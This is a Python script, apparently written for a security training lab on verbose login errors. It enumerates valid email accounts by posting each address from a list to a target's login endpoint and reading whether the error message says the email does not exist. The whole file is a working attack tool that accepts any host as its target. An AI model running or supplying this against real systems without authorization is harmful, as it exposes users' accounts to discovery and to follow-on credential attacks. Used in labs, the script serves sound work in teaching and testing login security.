import requests
import sys

def check_mail(email, host):
    # open your web browser for the target domain and paste the headers obtained via a proxy tool, modify them as needed
    vhost = host
    scheme = "http"
    url = f"{scheme}://{host}"           # connection target (IP:port)
    origin = f"{scheme}://{vhost}"       # vhost base
    headers = {
        'Host': vhost,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': origin,
        'Connection': 'close',
        'Referer': f"{origin}/labs/verbose_login/",
    }
    data = {
        'username': email,
        'password': 'password', # DEFAULT PASSWORD
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    try:
        return response.json()
    except Exception as e:
        print(f"Error: {e}")

def enumerate_emails(email_file, host_dom):
    valid_emails = []
    invalid_error = "Email does not exist" #Error message for invalid emails
    
    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            response_json = check_mail(email, host_dom)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"Invalid {email}")
            else:
                print(f"Valid {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <email_list_file> <host/domain>")
        sys.exit(1)

    email_file = sys.argv[1]
    host_dom = sys.argv[2]

    valid_emails = enumerate_emails(email_file, host_dom)
    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
